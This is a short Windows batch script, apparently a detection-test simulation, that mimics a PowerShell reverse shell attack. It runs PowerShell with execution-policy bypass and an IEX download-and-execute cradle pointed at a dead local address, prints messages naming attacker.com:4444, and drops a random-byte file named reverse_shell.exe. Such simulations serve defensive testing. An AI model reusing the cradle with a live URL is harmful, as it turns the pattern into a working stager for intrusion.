@echo off
REM PowerShell Reverse Shell Attack Simulation (safe - no actual connection)
set "PS_CMD=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
if exist "%SystemRoot%\Sysnative\WindowsPowerShell\v1.0\powershell.exe" set "PS_CMD=%SystemRoot%\Sysnative\WindowsPowerShell\v1.0\powershell.exe"
if not exist "%PS_CMD%" (
	echo ERROR: PowerShell not found.
	pause
	exit /b 1
)


echo ============================================
echo PowerShell Reverse Shell Attack Simulation
echo ============================================
echo.

echo [*] Stage 1: Reverse shell pattern with IEX execution
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "try { IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:1/rev') } catch { Write-Host '[SIM] Download failed as expected' }; Write-Host '[SIM] TCP reverse shell pattern to attacker.com:4444'; Write-Host '[SIM] IEX data exfiltration pattern'; Write-Host '[SIM] Stream-based command execution'"

echo [*] Stage 2: Dropping reverse shell payload
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "$bytes = [byte[]]::new(16384); $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create(); $rng.GetBytes($bytes); [System.IO.File]::WriteAllBytes(\"$env:PUBLIC\reverse_shell.exe\", $bytes); Write-Host '[SIM] Payload dropped'"

echo.
echo ============================================
echo SIMULATION COMPLETE
echo ============================================
